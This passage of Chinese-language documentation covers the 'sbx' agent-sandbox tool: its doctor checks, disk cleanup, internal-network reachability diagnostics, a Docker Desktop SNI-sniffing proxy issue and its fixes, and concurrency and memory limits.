  ✓ login       logged in: you@example.com · team · claude.ai
  ! trust       .sbx/ changed since you last confirmed it
      → sbx trust
  ✓ notify      open.feishu.cn is allowed automatically
  ! dd-proxy    Docker Desktop sends every container connection to 127.0.0.1:7890 and sniffs its SNI;
                the bypass list does not cover 10.0.0.1, 172.16.0.1, 192.168.0.1
      → that proxy decides by domain name, so an internal host is handed to a proxy node that cannot
        reach it — the failure surfaces as a TLS error, not as a routing one. Add your private ranges
        and internal domains under Docker Desktop → Settings → Resources → Proxies → Bypass, for
        example: *.corp.example,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16
  ✗ reach       prep:gitlab.corp.example: gitlab.corp.example:443 reachable at 10.42.0.50; TLS fails
                with SNI but succeeds without (unexpected eof while reading), while your machine
                handshakes fine with the same name
      → something on the container's path is reading the SNI and rewriting the destination by name …
  ✓ smoke       the screen of running sbx-shop-e76272-fix looks normal

2 warning(s), 2 failure(s)
```

十一项检查：docker 可用性、VM 内存够不够（R10）、**磁盘占用**、上游代理连通性、`sbx-proxy` 健康（R8）、登录态、信任状态、通知配置、**Docker Desktop 的透明代理**、**内网可达性**、首次启动冒烟（R9：claude 的内部状态字段随版本变化，卡在对话框上会让无人值守直接失效）。

- **只有 `✗` 才让 `sbx doctor` 非 0 退出**。`!` 的意思是"能用，但该改"——要是它也让命令失败，写进脚本的人就只能加 `|| true`，那警告就白给了。`--strict` 下警告也算失败。
- `--quick` 跳过慢的那两项（内网探针、冒烟检查）。
- 冒烟优先用现成的：有 Task 在跑就抓它的 tmux 画面，没有就跳过（`sbx run` 每次启动本来就会做这项检查）。
- **不要求你在 git 仓库里**。信任状态这类和仓库有关的项，不在仓库里时标成跳过。

### disk 这一项为什么只报告不自动删（M4-5）

sbx 的 volume、镜像和构建缓存都没有配额，而 `sbx done` 只回收 Task 自己的依赖 volume——`sbx-cache` / `sbx-home` / `sbx-mise` 是只涨不消的。Docker 的 local volume 驱动没有通用 quota，所以这一项**只列出占用，不替你删**：

- 可回收的部分超过 5g 时给 `!`，并指向 [`sbx clean`](#回收磁盘sbx-cleanm4-5)。
- **它不会自己动手**，因为"没有容器挂着"不等于"该删"：`sbx-home` 删掉要重新登录，`sbx-cache` 删掉下一个 Task 要重新下载一遍依赖。空闲 volume 那一行**不列** `sbx-cache` / `sbx-home` / `sbx-mise`——没 Task 在跑时它们必然是 0 links，每次都上榜，而它们恰恰是最不该顺手删的。
- 镜像按 **UniqueSize** 算：`Size` 会把共享的基础层重复计进每个镜像，加起来是个虚高的数。

```bash
sbx clean                        # 旧镜像 + 派生缓存，不需要网络就能回来
sbx clean --deep                 # 连包缓存和构建缓存一起（要重取，要确认）
sbx done <task>                  # 回收这个 Task 的依赖 volume
sbx prep drop --all              # 连当前种子镜像一起删——删的是恢复能力，想清楚再用
```

### reach 这一项：回答「到底是不是沙箱的问题」（M4-18）

内网连不上有四种完全不同的原因，而症状都是"连不上"：**DNS、路由、TLS、对端策略**。沙箱只修得了前两种，后两种得去找服务方——但没有工具分辨时，所有人都会先怀疑沙箱，时间全花在调 sbx 上。

办法是**同一组探测在两个位置各跑一遍**，看它们在哪一级分裂：

```
        dns ──► tcp ──► tls+sni ──► tls-nosni
宿主机   ✓       ✓        ✗           ✓
容器     ✓       ✓        ✗           ✓
                         └── 两边停在同一级 = 不是沙箱的问题
```

| 分裂形状 | 级别 | 结论 |
|---|---|---|
| 容器通到 tcp | `✓` | 洞是好的。顺带报出对端证书的签发者，确认你连到的是那台机器 |
| 宿主机通、容器卡在 **dns** | `✗` | 容器用的是 Docker VM 的解析器，不是你机器的 |
| 宿主机通、容器卡在 **tcp** | `✗` | 你的机器有一条 VM 没有的路由——通常是代理例外表。改 Docker Desktop → Settings → Resources → **Proxies → Bypass** |
| 两边都卡在 **dns** | `!` | 名字写错，或者要连的 VPN 没开。和沙箱无关 |
| 两边都卡在 **tcp** | `!` | 对端或它前面的网络在拒绝。**sbx 绕不过去**，去找那个服务的负责人（[boundary.md §3.4](boundary.md)） |
| tcp 通、带 SNI 断、裸 IP 通、**宿主机带 SNI 也断** | `!` | 对端看到服务器名之后主动断开。这是对端的策略；取 go 模块的话改用 `sbx prep build` 预抓 |
| tcp 通、带 SNI 断、裸 IP 通、**宿主机带 SNI 正常** | `✗` | 不是对端——是容器出去的那条路在按 SNI 改写目的地。见下面的 [dd-proxy](#dd-proxy-这一项为什么必须单独存在m4-19) |

几个实现上的决定：

- **探针跑在 `sbx-egress` 上**（没有就退回默认 bridge）——那是 forwarder 和 squid 待的位置，也就是沙箱实际从哪里出去。**不是** Task 自己的 internal 网络：那张网按设计没有默认路由，在那儿探什么都不通，量到的是设计而不是故障。
- **目标有三个来源**，覆盖运行期和构建期（M4-19）：`[[forward]]` 的每一条、`network.allow` 里解析到私有地址的那些、以及 prep 文件里出现过的主机名。后两类都**先解析、只留落在私有地址的**——这既是"值得探"的判据，也是不去骚扰公网主机的保险。输出里的 `allow:` / `prep:` 前缀说明这个目标是从哪条配置推出来的。
- 配了 `host` 的 forward 按真实域名探，否则测不到对端的 SNI 策略。`to` 写成裸端口号的（指向宿主机）不探：那条路由由 Docker 自己维护。
- **prep 那一类是启发式，不是契约**：按正则从 Dockerfile 里捞主机名，注释行整行跳过（模板里全是 `gitlab.corp.example` 这类示例）。这么做的理由是，Dockerfile 里没有地方声明"我要触达哪个内网源"，而那恰恰是最容易被代理咬到的一类。
- 一个目标都没找到就跳过，不猜地址；最多探 6 个，四级 × 两个位置，再有用也不能把 doctor 拖成分钟级。
- 容器侧复用 forwarder 已经 pin 住的 `alpine/socat` 镜像，宿主机侧用 Go 自己的 `net` 和 `crypto/tls`——**刻意不调 curl**，macOS 自带的是 LibreSSL，它和系统代理的交互会给出和实际不符的结论。
- TLS 两级只在 443 / 8443 / 9443 上跑。`forward` 是纯 TCP 中继，握不握得上手不归它管，所以 TLS 的结果**不会**把这一项打成 `✗`，它是诊断上下文。

### dd-proxy 这一项为什么必须单独存在（M4-19）

这一项是被一次真实故障逼出来的。现象分两层：

1. `sbx prep build` 拉私有 Go module，报 `x509: certificate signed by unknown authority`。原因是 `COPY` 进去的私有 CA 是 **DER 格式、扩展名是 `.cer`**——`update-ca-certificates` 只扫 `*.crt` 且只认 PEM，两条都不满足就**静默跳过并 exit 0**，构建一路走到 `go mod download` 才炸。
2. CA 修好之后错误变成 `EOF`。真正的原因在两层之外。

第二层是这样的：Docker Desktop 开着 `VpnKitTransparentProxy` 时，会**嗅探容器出站连接的 SNI**，然后向宿主机代理发 `CONNECT <嗅到的域名>:443`。于是同一个 `10.10.16.50:443`：

```
带 SNI   → CONNECT gitlab.corp.example:443 → 代理按域名判，内网域名没规则 → 发给代理节点 → 断
不带 SNI → CONNECT 10.10.16.50:443         → 代理按私有 IP 判，直连 → 通
```

把 SNI 换成 `example.com` 去连同一个内网 IP，拿回来的是 **Cloudflare 签的证书**——这是最硬的那个反证：连接根本没到那个 IP。

**为什么单独一项、而且不归 Slow：**

- 它只读一个 JSON 文件（`settings-store.json`）加问一次系统代理，不碰网络也不碰 docker，所以 `--quick` 也跑。它是**唯一能在构建失败之前就说出这件事**的检查。
- [boundary.md §2.8 坑一](boundary.md) 不够。那条说 `sbx prep build` 要清掉 `HTTP_PROXY` / `HTTPS_PROXY`——确实清了，但**透明拦截根本不在环境变量里，清不掉**。
- `reach` 只探运行期的目标，而这次故障在构建期。同一个根因，但旧版本的 `reach` 即便探到了也会把它判成"对端的 SNI 策略，改用 `sbx prep build`"——而 prep build 走的正是同一条路，照着做只会再撞一次墙。

报警条件是三者同时成立：**代理确实在用**（`manual` 模式配了上游，或 `system` 模式且系统里真有代理）、**透明拦截开着**、**Bypass 列表没覆盖三个 RFC 1918 网段**。少一条都不报——`doctor` 里的噪音会让人连真的警告一起忽略。

> 提示里那句"代理是按**名字**被问的"是重点。这次故障里代理本身是有私有 IP 直连规则的，坏就坏在 Docker 把"按 IP"变成了"按域名"，恰好绕开了那条规则。只加网段不加域名，同样会再踩一次。

修法（按偏好排序）：

1. **Docker Desktop → Settings → Resources → Proxies → Bypass**，把内网域名和私有网段都填进去：`*.corp.example,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16`。
2. 在代理客户端里给内网域名加一条 DIRECT 规则（Clash / mihomo 系还要一并处理 `dns.nameserver-policy`、`fake-ip-filter` 和 `sniffer.skip-domain`，少一个就还会漏）。
3. 关掉 Docker Desktop 的代理（`ProxyHTTPMode = off`）。

自己手工复现这个判断,两条命令就够——一条通一条不通就是它：

```bash
curl -sS -o /dev/null -w "direct  %{http_code}\n" --noproxy '*' --max-time 10 \
  "https://gitlab.corp.example/some/repo?go-get=1" --cacert .sbx/ca/corp.crt
curl -sS -o /dev/null -w "proxied %{http_code}\n" --proxy http://127.0.0.1:7890 --max-time 10 \
  "https://gitlab.corp.example/some/repo?go-get=1" --cacert .sbx/ca/corp.crt
```

---

---

## 并发与内存（M2-14、design §11、R10）

`sbx run` 在真要启动一个容器之前查两件事：

**并发**：正在运行的 agent 容器数达到 `max_running`（默认 3）就拒绝，并列出是谁占着。

```
$ sbx run api
sbx: 已经有 3 个 Task 在跑，达到 max_running = 3：shop-e76272.main、shop-e76272.fix、blog-a1b2c3.main
先 sbx stop 掉一个，或者在 ~/.sbx/config.toml 里调大 max_running（注意内存：每个 Task 上限 3g）
```

计数是**跨 Workspace 的**——`max_running` 管的是 Docker VM 的内存，而那是所有仓库共用的；限额本身取自你当前所在仓库的配置。`sbx run` 一个已经在跑的 Task 只是 attach，不占新名额，不会被自己挡住。启动一个已停止的 Task 同样要过这一关（design §10.1 把这步画在"新建"分支里，但重启一样多占一份内存）。

**内存预算**：`max_running × resources.memory` 超过 Docker VM 内存的 95% 时警告一次，不拒绝——`--memory` 是上限不是预留，用不满是常态。

```
警告: max_running(4) × resources.memory(3g) = 12.0g，超过 Docker VM 内存 9.7g 的 95%。
并发跑满时可能触发 VM 级 OOM；调小 max_running 或 memory，或者把 Docker 的内存调大。
```

VM 内存取自 `docker info` 的 `MemTotal`，Docker Desktop 下就是那台 VM 的内存，不是你机器的内存。算的是 agent 容器，代理不算在内：`sbx-proxy` 固定 128m，dedicated 模式下每个 Task 的 sidecar 各 128m，这部分算在留给 VM 的余量里。

阈值本来定的是 85%（R10），2026-10-09 放宽到 95%：85% 下推荐配置（10GB VM + 3 × 3g = 9g）自己就会报警，每次 `sbx run` 都刷一条，等于没有警告。95% 下推荐配置安静，而 `4 × 3g` 或 VM 只给 8GB 这类真的配过头的仍然会响。

---

## 环境变量

| 变量 | 作用 |
|---|---|
| `SBX_HOME` | sbx 数据目录，默认 `~/.sbx`。测试或多套环境隔离用 |
| `SBX_HOST_CLAUDE` | 宿主机 `~/.claude` 的位置，影响记忆导入导出 |
| `TZ` | 有则直接用，否则读 `/etc/localtime` 的软链；注入容器，让 Agent 的日志和提交时间跟你一致 |

容器里的 Agent 和通知命令能看到：`SBX_WS`、`SBX_TASK`，以及通知命令额外拿到的 `SBX_EVENT`、`SBX_STATE`、`SBX_TS`、`SBX_EXIT_CODE`（headless）。

## 当前的边界

- **没有 `sbx merge`**，合并永远是你在主仓库手动做；分支有 commit 没合并时 `done` 不会提醒。
- **伴生服务和 forward 按名字访问，不是 `localhost`**：它们是另外的容器，而 `localhost` 在 Task 里指的是 Task 自己。
- **`[[services]]` 不计入内存预算**：服务容器不设内存上限（给 postgres 猜一个小数字的后果是启动即 OOM，比不限更糟），而 `doctor` 的 `vm-memory` 只算 `max_running × resources.memory`。起了重服务时自己留余量。
- **`forward` 没有审计**：squid 管不了裸 TCP，所以 forwarder 的流量不进访问日志、`sbx net denied` 也看不见。补偿手段是"必须逐条显式声明 + 每次 `sbx run` 打印 + 记进 meta"。
- **prep 的凭据只在 build 期存在**：Task 跑到一半才发现缺一个私有依赖时，它装不上——这是设计，不是缺陷。重跑 `sbx prep build` 再建 Task。
- 上游代理只支持 http；只有 SOCKS 的宿主机代理需要你自己加一层转发（design §6.4）。
- **Codex 还没接**（M3-6）：`--agent codex` 和 `default_agent = "codex"` 目前会明确报错。
- 底层镜像必须是 Debian/Ubuntu 系（ADR 0007）。
